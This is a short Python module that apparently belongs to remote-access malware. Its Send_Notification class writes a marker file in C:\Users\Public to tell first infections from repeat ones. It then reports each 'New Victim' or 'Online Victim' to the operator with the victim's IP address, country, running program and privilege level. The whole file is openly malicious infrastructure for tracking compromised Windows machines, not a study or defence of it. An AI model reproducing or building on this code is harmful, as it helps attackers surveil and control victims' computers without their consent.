import os
class Send_Notification():
	def __init__(self, _):
		self.ip = _.ip
		self.country = _.country
		self.program = _.program
		self.privileges = _.privileges
		self.Send_Message = _.Send_Message
		self.Main()

	def Main(self):
		filename = "C:\\Users\\Public\\old.txt"
		if os.path.exists(filename):
			self.Send_Message.Send("%F0%9F%98%88  Online Victim : \n %E2%9D%96 IP Address : " + self.ip + "\n %E2%9D%96 Country : " + self.country + " \n %E2%9D%96 Program Name : " + self.program + "\n %E2%9D%96 Privileges : " + self.privileges)
		else:
			file = open("C:\\Users\\Public\\old.txt","w")
			self.Send_Message.Send("%F0%9F%98%88  New Victim : \n %E2%9D%96 IP Address : " + self.ip + "\n %E2%9D%96 Country : " + self.country + " \n %E2%9D%96 Program Name : " + self.program + "\n %E2%9D%96 Privileges : " + self.privileges)